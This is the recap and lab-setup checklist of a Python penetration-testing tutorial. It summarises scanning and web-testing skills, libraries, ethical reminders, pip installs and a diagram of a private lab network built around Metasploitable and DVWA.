## Tutorial Summary: From Reconnaissance to Automation

**🎯 What You've Accomplished:**

### Practical Skills Developed:
1. **Network Reconnaissance**
   - Built custom host discovery tools
   - Implemented threaded network scanning
   - Created professional port scanners with banner grabbing
   - Developed service identification techniques

2. **Web Application Testing**
   - Performed systematic web reconnaissance
   - Built SQL injection testing frameworks  
   - Implemented vulnerability detection algorithms
   - Created comprehensive web security assessment tools

### Real-World Applications:
- **Corporate Network Assessments**: Systematic evaluation of enterprise infrastructure
- **Web Application Security Testing**: Comprehensive vulnerability identification
- **Automated Security Monitoring**: Continuous assessment and reporting
- **Penetration Testing**: Structured approach to security evaluation

### Key Python Libraries Mastered:
- **Network Operations**: `socket`, `subprocess`, `threading`, `concurrent.futures`
- **Web Interactions**: `requests`, `urllib3`, `beautifulsoup4`
- **Data Processing**: `json`, `csv`, `datetime`, `argparse`
- **Security Libraries**: `paramiko`, `ftplib`, specialized security modules

### Professional Best Practices:
- **Authorization Verification**: Always confirm testing permissions
- **Rate Limiting**: Respectful scanning to avoid system disruption
- **Comprehensive Logging**: Detailed audit trails for all activities  
- **Executive Reporting**: Clear communication of technical findings
- **Risk-Based Prioritization**: Focus on highest-impact vulnerabilities

### Advanced Concepts Demonstrated:
- **Multi-threaded Operations**: Efficient parallel processing
- **Error Handling**: Robust exception management
- **Configuration Management**: Flexible tool customization
- **Report Generation**: Multiple output formats (JSON, HTML, CSV)
- **Framework Design**: Modular, extensible security tools

**🚀 Next Steps for Continued Learning:**

1. **Expand Target Scope**: Test additional protocols (SNMP, LDAP, etc.)
2. **Enhance Detection**: Add more sophisticated vulnerability identification
3. **Integrate Databases**: Connect with CVE and exploit databases
4. **Add Automation**: Schedule regular assessments and monitoring
5. **Develop Specializations**: Focus on specific areas (wireless, cloud, IoT)

**⚠️ Ethical Reminders:**
- Only test systems you own or have explicit written permission to assess
- Respect rate limits and system resources during testing
- Follow responsible disclosure for any vulnerabilities discovered
- Maintain detailed documentation for all authorized testing activities
- Stay current with legal requirements and industry standards

You now have practical, hands-on experience building professional-grade security assessment tools using Python - skills directly applicable to careers in cybersecurity, penetration testing, and security engineering!

**🔧 Essential Tools and Setup Checklist:**

### Laboratory Environment Setup:
- **Attack Platform**: Kali Linux VM (minimum 4GB RAM, 50GB disk)
- **Target Systems**: 
  - Metasploitable 2 (vulnerable Linux target)
  - DVWA (Damn Vulnerable Web Application)
  - Windows 10 VM (for client-side testing)
  - pfSense firewall (optional, for network segmentation)

### Python Environment Configuration:
```bash
# Essential library installation
pip install requests scapy python-nmap paramiko beautifulsoup4
pip install cryptography selenium pandas matplotlib
pip install colorama tqdm rich click
```

### Network Lab Architecture:
```
┌─────────────────┐    ┌──────────────────────────────────┐
│ Kali Linux      │    │ Target Network (192.168.1.0/24) │
│ (Attacker)      │────┤                                  │
│ 192.168.1.100   │    │ ├─ 192.168.1.10 (Metasploitable)│
└─────────────────┘    │ ├─ 192.168.1.20 (DVWA)           │
                       │ ├─ 192.168.1.30 (Windows Target) │
                       │ └─ 192.168.1.1 (Gateway/Router)  │
                       └──────────────────────────────────┘
```

### Professional Development Environment:
- **IDE**: VS Code with Python extensions
- **Version Control**: Git for code management
- **Documentation**: Markdown for technical notes
- **Reporting**: HTML/PDF generation capabilities

### Legal and Ethical Framework:
- **Written Authorization**: Always obtain explicit permission
- **Scope Definition**: Clear boundaries for testing activities
- **Data Handling**: Secure storage and disposal of sensitive information
- **Responsible Disclosure**: Proper vulnerability reporting procedures
- **Compliance**: Adherence to local laws and regulations